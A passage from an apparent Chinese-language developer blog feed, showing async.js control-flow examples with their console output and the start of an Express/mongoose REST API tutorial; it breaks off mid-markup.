    <content type="html"><![CDATA[<blockquote><p>AsyncJS 指的是 <a href="https://github.com/caolan/async" target="_blank" rel="external">async</a>，是一个异步处理的组件。</p></blockquote><h4 id="Series-和-Limit-的区别"><a href="#Series-和-Limit-的区别" class="headerlink" title="Series 和 Limit 的区别"></a>Series 和 Limit 的区别</h4><ul><li><name>Series - the same as <name> but runs only a single async operation at a time</name></name></li><li><name>Limit - the same as <name> but runs a maximum of limit async operations at a time</name></name></li></ul><a id="more"></a><h4 id="async-map"><a href="#async-map" class="headerlink" title="async.map"></a>async.map</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> names = [<span class="string">'James'</span>, <span class="string">'Kobe'</span>, <span class="string">'Havard'</span>, <span class="string">'Jermmy'</span>, <span class="string">'Rondo'</span>];</div><div class="line"></div><div class="line"><span class="keyword">async</span>.map(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>)</span>&#123;</div><div class="line">    callback(<span class="literal">null</span>, name.toUpperCase());</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ <span class="string">'JAMES'</span>, <span class="string">'KOBE'</span>, <span class="string">'HAVARD'</span>, <span class="string">'JERMMY'</span>, <span class="string">'RONDO'</span> ]</div></pre></td></tr></table></figure><h4 id="async-each"><a href="#async-each" class="headerlink" title="async. each"></a>async. each</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.each(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(name);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">'function'</span>) callback();</div><div class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">James</div><div class="line">Kobe</div><div class="line">Havard</div><div class="line">Jermmy</div><div class="line">Rondo</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-eachSeries"><a href="#async-eachSeries" class="headerlink" title="async.eachSeries"></a>async.eachSeries</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.eachSeries(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(name);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">'function'</span>) callback();</div><div class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">James</div><div class="line">Kobe</div><div class="line">Havard</div><div class="line">Jermmy</div><div class="line">Rondo</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-parallel"><a href="#async-parallel" class="headerlink" title="async.parallel"></a>async.parallel</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.parallel([<span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'yy'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'xx'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'dd'</span>);</div><div class="line">    callback();</div><div class="line">&#125;], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">yy</div><div class="line">xx</div><div class="line">dd</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-waterfall"><a href="#async-waterfall" class="headerlink" title="async.waterfall"></a>async.waterfall</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.waterfall([<span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'yy'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'xx'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'dd'</span>);</div><div class="line">    callback();</div><div class="line">&#125;], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">yy</div><div class="line">xx</div><div class="line">dd</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-filterLimit"><a href="#async-filterLimit" class="headerlink" title="async.filterLimit"></a>async.filterLimit</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.filterLimit(names, <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (name === <span class="string">'James'</span>) &#123;</div><div class="line">    callback(name);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    callback();</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">results</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(results);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ <span class="string">'James'</span> ]</div></pre></td></tr></table></figure><h4 id="async-reject"><a href="#async-reject" class="headerlink" title="async.reject"></a>async.reject</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.reject(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (name === <span class="string">'James'</span>) &#123;</div><div class="line">    callback(name);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    callback();</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">results</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(results);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ <span class="string">'Kobe'</span>, <span class="string">'Havard'</span>, <span class="string">'Jermmy'</span>, <span class="string">'Rondo'</span> ]</div></pre></td></tr></table></figure><h4 id="async-reduce"><a href="#async-reduce" class="headerlink" title="async.reduce"></a>async.reduce</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.reduce([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">memo, num, callback</span>) </span>&#123;</div><div class="line">    callback(<span class="literal">null</span>, memo + num);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">10</span></div></pre></td></tr></table></figure><h4 id="async-every"><a href="#async-every" class="headerlink" title="async.every"></a>async.every</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.every(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">'string'</span>) &#123;</div><div class="line">    callback(<span class="literal">true</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    callback(<span class="literal">false</span>);</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="literal">true</span></div></pre></td></tr></table></figure><h4 id="async-auto"><a href="#async-auto" class="headerlink" title="async.auto"></a>async.auto</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.auto(&#123;</div><div class="line">    get_data: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in get_data'</span>);</div><div class="line">        <span class="comment">// async code to get some data</span></div><div class="line">        callback(<span class="literal">null</span>, <span class="string">'data'</span>, <span class="string">'converted to array'</span>);</div><div class="line">    &#125;,</div><div class="line">    make_folder: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in make_folder'</span>);</div><div class="line">        <span class="comment">// async code to create a directory to store a file in</span></div><div class="line">        <span class="comment">// this is run at the same time as getting the data</span></div><div class="line">        callback(<span class="literal">null</span>, <span class="string">'folder'</span>);</div><div class="line">    &#125;,</div><div class="line">    write_file: [<span class="string">'get_data'</span>, <span class="string">'make_folder'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">callback, results</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in write_file'</span>, <span class="built_in">JSON</span>.stringify(results));</div><div class="line">        <span class="comment">// once there is some data and the directory exists,</span></div><div class="line">        <span class="comment">// write the data to a file in the directory</span></div><div class="line">        callback(<span class="literal">null</span>, <span class="string">'filename'</span>);</div><div class="line">    &#125;],</div><div class="line">    email_link: [<span class="string">'write_file'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">callback, results</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in email_link'</span>, <span class="built_in">JSON</span>.stringify(results));</div><div class="line">        <span class="comment">// once the file is written let's email a link to it...</span></div><div class="line">        <span class="comment">// results.write_file contains the filename returned by write_file.</span></div><div class="line">        callback(<span class="literal">null</span>, &#123;<span class="string">'file'</span>:results.write_file, <span class="string">'email'</span>:<span class="string">'user@example.com'</span>&#125;);</div><div class="line">    &#125;]</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, results</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'err = '</span>, err);</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'results = '</span>, results);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">in</span> get_data</div><div class="line"><span class="keyword">in</span> make_folder</div><div class="line"><span class="keyword">in</span> write_file &#123;<span class="string">"get_data"</span>:[<span class="string">"data"</span>,<span class="string">"converted to array"</span>],<span class="string">"make_folder"</span>:<span class="string">"folder"</span>&#125;</div><div class="line"><span class="keyword">in</span> email_link &#123;<span class="string">"get_data"</span>:[<span class="string">"data"</span>,<span class="string">"converted to array"</span>],<span class="string">"make_folder"</span>:<span class="string">"folder"</span>,<span class="string">"write_file"</span>:<span class="string">"filename"</span>&#125;</div><div class="line">err =  <span class="literal">null</span></div><div class="line">results =  &#123; <span class="attr">get_data</span>: [ <span class="string">'data'</span>, <span class="string">'converted to array'</span> ],</div><div class="line">    make_folder: <span class="string">'folder'</span>,</div><div class="line">    write_file: <span class="string">'filename'</span>,</div><div class="line">    email_link: &#123; <span class="attr">file</span>: <span class="string">'filename'</span>, <span class="attr">email</span>: <span class="string">'user@example.com'</span> &#125; &#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;AsyncJS 指的是 &lt;a href=&quot;https://github.com/caolan/async&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;async&lt;/a&gt;，是一个异步处理的组件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;Series-和-Limit-的区别&quot;&gt;&lt;a href=&quot;#Series-和-Limit-的区别&quot; class=&quot;headerlink&quot; title=&quot;Series 和 Limit 的区别&quot;&gt;&lt;/a&gt;Series 和 Limit 的区别&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;name&gt;Series - the same as &lt;name&gt; but runs only a single async operation at a time&lt;/name&gt;&lt;/name&gt;&lt;/li&gt;
&lt;li&gt;&lt;name&gt;Limit - the same as &lt;name&gt; but runs a maximum of limit async operations at a time&lt;/name&gt;&lt;/name&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="async" scheme="http://youngdze.co/tags/async/"/>
    
  </entry>
  
  <entry>
    <title>Express 基础</title>
    <link href="http://youngdze.co/2015/09/01/express-basis/"/>
    <id>http://youngdze.co/2015/09/01/express-basis/</id>
    <published>2015-09-01T15:53:04.000Z</published>
    <updated>2016-12-05T11:32:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="创建-package-json"><a href="#创建-package-json" class="headerlink" title="创建 package.json"></a>创建 package.json</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"name"</span>: <span class="string">"express-basis"</span>,</div><div class="line">    <span class="attr">"main"</span>: <span class="string">"service.js"</span>,</div><div class="line">    <span class="attr">"dependencies"</span>: &#123;</div><div class="line">    <span class="attr">"body-parser"</span>: <span class="string">"^1.13.3"</span>,</div><div class="line">    <span class="attr">"express"</span>: <span class="string">"^4.13.3"</span>,</div><div class="line">    <span class="attr">"jade"</span>: <span class="string">"^1.11.0"</span>,</div><div class="line">    <span class="attr">"mongoose"</span>: <span class="string">"^4.1.4"</span>,</div><div class="line">    <span class="attr">"morgan"</span>: <span class="string">"^1.6.1"</span>,</div><div class="line">    <span class="attr">"underscore"</span>: <span class="string">"^1.8.3"</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><ul><li>body-parser 是为了取得 <code>req.body.param</code>。</li><li>express 是框架。</li><li>jade 是渲染引擎。</li><li>mongoose 操作 <strong>MongoDB</strong>。</li><li>morgan 输出访问信息。</li><li>underscore 是<strong>神器</strong>。</li></ul><a id="more"></a><h4 id="着手-service-js"><a href="#着手-service-js" class="headerlink" title="着手 service.js"></a>着手 service.js</h4><p><code>npm install</code> 之后，开始写 <code>server.js</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</div><div class="line"><span class="keyword">var</span> app = express();</div><div class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</div><div class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"><span class="keyword">var</span> jade = <span class="built_in">require</span>(<span class="string">'jade'</span>);</div><div class="line"><span class="keyword">var</span> _ = <span class="built_in">require</span>(<span class="string">'underscore'</span>);</div><div class="line"></div><div class="line">##### 使用 _morgan_ 输出访问信息</div><div class="line"></div><div class="line">app.use(morgan(<span class="string">'dev'</span>)); <span class="comment">// log requests to the console</span></div><div class="line"></div><div class="line">##### 配置 _body-parser_</div><div class="line"></div><div class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;));</div><div class="line">app.use(bodyParser.json());</div></pre></td></tr></table></figure><h4 id="设置端口"><a href="#设置端口" class="headerlink" title="设置端口"></a>设置端口</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> port = process.env.PORT || <span class="number">2100</span>;</div></pre></td></tr></table></figure><h4 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</div><div class="line">mongoose.connect(<span class="string">'mongodb://127.0.0.1:27017/rest'</span>); <span class="comment">// connect to our database</span></div></pre></td></tr></table></figure><h4 id="添加-middleware-通过-router-use"><a href="#添加-middleware-通过-router-use" class="headerlink" title="添加 middleware 通过 router.use"></a>添加 <code>middleware</code> 通过 <em>router.use</em></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> router = express.Router();</div><div class="line"></div><div class="line"><span class="comment">// middleware to use for all requests</span></div><div class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    <span class="comment">// do logging</span></div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Something is happening.'</span>);</div><div class="line">    next();</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="测试路由"><a href="#测试路由" class="headerlink" title="测试路由"></a>测试路由</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">    res.json(&#123;<span class="attr">message</span>: <span class="string">'hooray! welcome to our api!'</span>&#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="添加一个-app-models-bear-js"><a href="#添加一个-app-models-bear-js" class="headerlink" title="添加一个 app/models/bear.js"></a>添加一个 <code>app/models/bear.js</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> mongoose     = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</div><div class="line"><span class="keyword">var</span> Schema       = mongoose.Schema;</div><div class="line"></div><div class="line"><span class="keyword">var</span> BearSchema   = <span class="keyword">new</span> Schema(&#123;</div><div class="line">    name: <span class="built_in">String</span></div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = mongoose.model(<span class="string">'Bear'</span>, BearSchema);</div></pre></td></tr></table></figure><h4 id="往-MongoDB-添加数据和获取数据"><a href="#往-MongoDB-添加数据和获取数据" class="headerlink" title="往 MongoDB 添加数据和获取数据"></a>往 <strong>MongoDB</strong> 添加数据和获取数据</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Bear = <span class="built_in">require</span>(<span class="string">'./app/models/bear'</span>);</div><div class="line"></div><div class="line">router.route(<span class="string">'/bears'</span>)</div><div class="line">    .post(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> bear = <span class="keyword">new</span> Bear();      <span class="comment">// create a new instance of the Bear model</span></div><div class="line">        bear.name = req.body.name;  <span class="comment">// set the bears name (comes from the request)</span></div><div class="line"></div><div class="line">        bear.save(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            res.json(&#123;<span class="attr">message</span>: <span class="string">'Bear created!'</span>&#125;);</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">    &#125;)</div><div class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.find(<span class="function"><span class="keyword">function</span> (<span class="params">err, bears</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            res.json(bears);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure><h4 id="添加数据库搜索、更新和删除功能"><a href="#添加数据库搜索、更新和删除功能" class="headerlink" title="添加数据库搜索、更新和删除功能"></a>添加数据库搜索、更新和删除功能</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">router.route(<span class="string">'/bears/:bear_id'</span>)</div><div class="line"></div><div class="line">    <span class="comment">// get the bear with that id</span></div><div class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.findById(req.params.bear_id, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line">            res.json(bear);</div><div class="line">        &#125;);</div><div class="line">    &#125;)</div><div class="line"></div><div class="line">    <span class="comment">// update the bear with this id</span></div><div class="line">    .put(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.findById(req.params.bear_id, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            bear.name = req.body.name;</div><div class="line">            bear.save(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    res.send(err);</div><div class="line"></div><div class="line">                res.json(&#123;<span class="attr">message</span>: <span class="string">'Bear updated!'</span>&#125;);</div><div class="line">            &#125;);</div><div class="line"></div><div class="line">        &#125;);</div><div class="line">    &#125;)</div><div class="line">    <span class="comment">// delete the bear with this id</span></div><div class="line">    .delete(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">        Bear.remove(&#123;</div><div class="line">            _id: req.params.bear_id</div><div class="line">        &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (err)</div><div class="line">                res.send(err);</div><div class="line"></div><div class="line">            res.json(&#123;<span class="attr">message</span>: <span class="string">'Successfully deleted'</span>&#125;);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure><h4 id="注册路由"><a href="#注册路由" class="headerlink" title="注册路由"></a>注册路由</h4><p>意味着上述 <code>router</code> 操作都是在 <code>/api</code> 下完成的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app.use(<span class="string">'/api'</span>, router);</div></pre></td></tr></table></figure><h4 id="设置模板路径、模板渲染引擎和渲染配置"><a href="#设置模板路径、模板渲染引擎和渲染配置" class="headerlink" title="设置模板路径、模板渲染引擎和渲染配置"></a>设置模板路径、模板渲染引擎和渲染配置</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">app.set(<span class="string">'views'</span>, path.join(__dirname + <span class="string">'/views'</span>));</div><div class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'jade'</span>);</div><div class="line"><span class="comment">// 默认为 development，编译代码为 pretty</span></div><div class="line">app.locals.pretty = app.get(<span class="string">'env'</span>) != <span class="string">'production'</span>;</div></pre></td></tr></table></figure><h4 id="设置静态文件路径"><a href="#设置静态文件路径" class="headerlink" title="设置静态文件路径"></a>设置静态文件路径</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'public'</span>));</div></pre></td></tr></table></figure><h4 id="设置页面数据和渲染文件"><a 